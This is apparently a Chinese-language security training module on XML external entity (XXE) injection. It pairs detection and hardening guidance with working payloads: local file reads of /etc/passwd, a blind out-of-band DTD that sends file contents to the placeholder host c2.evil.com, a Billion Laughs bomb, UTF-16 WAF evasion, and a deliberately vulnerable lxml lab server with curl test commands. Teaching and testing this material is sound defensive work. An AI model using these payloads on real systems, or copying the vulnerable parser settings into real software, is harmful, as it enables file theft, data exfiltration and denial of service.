# R12.2 XML 外部實體注入與處理機制分析 (XML External Entity Processing Abuse)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**XML 外部實體注入 (XXE)** 發生於應用程式解析不可信 XML 串流時。其本質為：**「底層 XML 剖析器（libxml2、Xerces 等）預設啟用了 DTD 外部實體解析；攻擊者構造自訂 `SYSTEM` 識別符，迫使伺服器主動讀取本機敏感檔案、發起內網 SSRF、或透過帶外 (OOB) 通道外洩資料」**。

```
[攻擊者] ── 1. 發送含 DTD 外部實體的 XML ──► [Web/API 端點]
                                                  │
                                                  ▼ 呼叫 parse() 且未禁用 DTD
                                         [底層 XML 剖析器]
                                                  │
                   ┌──────────────────────────────┴──────────────────────────────┐
                   ▼ (本地資源解析)                                               ▼ (網路協定解析)
        [讀取 file:///etc/passwd]                                     [發起 HTTP/FTP 請求 (SSRF / OOB)]
                   │                                                             │
                   ▼                                                             ▼
        [節點替換 / 回顯至回應中]                                     [向外部 C2 外傳機密資料]
```

### 核心作戰決策與邊界
- **常見場景**：SAML 認證斷言、SOAP API、SVG 圖片上傳、Office 文件解析 (DOCX/XLSX)。
- **作戰決策心流**：
  1. **有回顯 (In-Band)**：直接引用通用實體 `&xxe;` 讀取檔案並於回應中檢視。
  2. **錯誤回顯 (Error-Based)**：利用非法實體宣告迫使剖析器將檔案內容打印至例外訊息中。
  3. **完全無回顯 (Blind OOB)**：利用參數實體 `%dtd;` 加載遠端惡意 DTD，將檔案內容作為 URL 參數外傳至 C2。
- **技術邊界**：
  - **與 SSRF (R11.1) 差異**：XXE 的網路出站是透過 XML 剖析器的實體解析回調觸發，且具備本地檔案直接讀取能力。

## 🔬 第一動：底層機制與實體語法解析 (Mechanics & DTD Syntax)

### 通用實體 vs. 參數實體速查表

| 實體類型 | 宣告語法 | 引用方式與作用域 | 典型利用場景 |
| :--- | :--- | :--- | :--- |
| **通用實體 (General)** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | 在 XML Body 透過 `&xxe;` 引用 | 有回顯端點的本機任意檔案讀取 |
| **參數實體 (Parameter)** | `<!ENTITY % oob SYSTEM "http://c2/evil.dtd">` | 僅能在 DTD 區塊內透過 `%oob;` 引用 | 載入遠端 DTD、構建動態外傳鏈 |

### 協定支援差異 (libxml2 vs. Java)
- **Java Xerces**：支援 `file://`、`http://`、`https://`、`ftp://`，不支援 `gopher://`。
- **PHP libxml2**：支援 `file://`、`php://filter/read=convert.base64-encode/resource=...`（可讀二進位檔案）、`expect://`（若安裝可直接 RCE）。

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心注入向量速查表

#### 1. 有回顯標準檔案讀取 (In-Band XXE)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

#### 2. 無回顯帶外外洩 (Blind OOB XXE)
```xml
<!-- 發送給目標的 XML -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://c2.evil.com/evil.dtd">
  %remote;
  %send;
]>
<root>test</root>
```
```xml
<!-- 託管於 c2.evil.com/evil.dtd 的內容 -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://c2.evil.com/?data=%file;'>">
%eval;
```

#### 3. 拒絕服務攻擊 (Billion Laughs / XML Bomb)
```xml
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>
```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **編碼規避**：
  - 修改 XML 標頭編碼宣告：`<?xml version="1.0" encoding="UTF-16"?>`，將整個封包轉為 UTF-16 繞過僅支援 ASCII/UTF-8 的 WAF 正則。
- **PHP Filter 封裝**：
  - 讀取包含 `<` 或 `&` 的程式碼檔案時使用 Base64：  
    `<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">`。
- **鑑識特徵**：
  - **日誌特徵**：存取請求中包含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://` 等字串。
  - **網路遙測**：伺服器向外部非預期 IP 發起 HTTP/FTP 連線（尤其是 Blind XXE 外洩流量）。

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

| 攻擊模式 (Offense) | 藍隊遙測指標 (Blue Telemetry) | 防禦基線反制 (Mitigation Baseline) | 繞過與殘餘考量 (Residual Seam) |
| :--- | :--- | :--- | :--- |
| **本機檔案讀取** | 系統層監視 Web 進程開啟敏感系統檔案 | 剖析器全面停用 DTD (`disallow-doctype-decl`) | 尋找未套用安全設定的次要解析模組 |
| **Blind OOB 外洩** | Egress 偵測到向外網發起的非預期 HTTP 請求 | 限制主機出站白名單；停用外部 DTD 加載 | 利用本地預置 DTD 觸發報錯回顯 |
| **XML 實體炸彈** | CPU 與記憶體瞬間飆升至 100% (OOM) | 限制實體擴展數量上限與解析深度 | 結合微型炸彈多次重試耗盡連線池 |
| **SAML/SVG 隱性注入** | 上傳檔案 MIME 為 XML/SVG 但內容含 DTD | 圖片解析前進行實體清理；禁用 DTD | 採用 Polyglot 格式繞過前端副檔名檢查 |

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. Java 剖析器（Xerces / DOMParser）黃金加固標準
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// 核心第一條：徹底禁用 DOCTYPE 宣告（直接根除 XXE）
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// 補充縱深防禦：禁止外部實體與參數實體
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### 2. Python defusedxml 安全替代庫
```python
# 嚴格禁止使用 xml.etree.ElementTree 直接解析不可信輸入
import defusedxml.ElementTree as ET

# defusedxml 預設全面攔截外部實體與實體炸彈
root = ET.fromstring(user_untrusted_xml)
```

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場核心代碼 (`xxe_lab.py`，極簡 25 行)
```python
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from lxml import etree

class XXEHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        len_ = int(self.headers.get('Content-Length', 0))
        raw_xml = self.rfile.read(len_)
        
        safe = "safe=1" in self.path
        # 脆弱模式：開啟 dtd_validation 與 resolve_entities
        parser = etree.XMLParser(resolve_entities=not safe, no_network=safe)
        try:
            root = etree.fromstring(raw_xml, parser)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Result: " + root.find("name").text.encode() + b"\n")
        except Exception as e:
            self.send_response(400); self.end_headers(); self.wfile.write(str(e).encode())

ThreadingHTTPServer(("127.0.0.1", 8122), XXEHandler).serve_forever()
```

### 2. 三步驗證流程

1. **發送 XXE 檔案讀取載荷**：
   ```bash
   curl -s -X POST "http://127.0.0.1:8122/" -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><user><name>&xxe;</name></user>'
   ```
2. **檢視回顯結果**：
   - 回顯中包含 `/etc/hosts` 檔案內容，證實外部實體被成功解析！
3. **驗證加固端點**：
   ```bash
   curl -s -X POST "http://127.0.0.1:8122/?safe=1" -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><user><name>&xxe;</name></user>'
   # 回顯報錯或純文字，實體無法被替換，加固生效！
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. XXE 漏洞的核心物理成因是什麼？**  
  *分析思路*：XML 剖析器預設支援 W3C DTD 規範中的外部實體解析；若未主動關閉，攻擊者可透過 `SYSTEM` 宣告讓伺服器讀取本地檔案或外發網路連線。

- [ ] **Q2. 何謂 Blind XXE？在目標完全不回顯節點文字時如何取證？**  
  *分析思路*：目標解析 XML 但不輸出任何結果。利用參數實體加載外部 DTD，透過 URL 參數將檔案內容以帶外 (OOB) HTTP/FTP 請求傳遞至攻擊者伺服器。

- [ ] **Q3. UTF-16 編碼為何能有效繞過傳統 WAF 的 XXE 偵測？**  
  *分析思路*：傳統 WAF 多預設以 ASCII 或 UTF-8 解碼封包，UTF-16 包含大量的 `\x00` 空字節，會使 WAF 正則匹配失敗，但符合 XML 規範的底層剖析器仍能自動識別 BOM 頭並正常解析。

- [ ] **Q4. 什麼是 XML 實體炸彈 (Billion Laughs Attack)？**  
  *分析思路*：利用多層嵌套的內部實體遞迴引用，使幾百位元組的 XML 在記憶體中指數級膨脹為數十 GB，迅速耗盡伺服器 RAM 導致 DoS。

- [ ] **Q5. 防範 XXE 最徹底、業界公認唯一的最佳實踐配置是什麼？**  
  *分析思路*：全域停用 DTD 解析（如 Java 中宣告 `disallow-doctype-decl = true`），徹底禁止 `<!DOCTYPE` 宣告的存在。
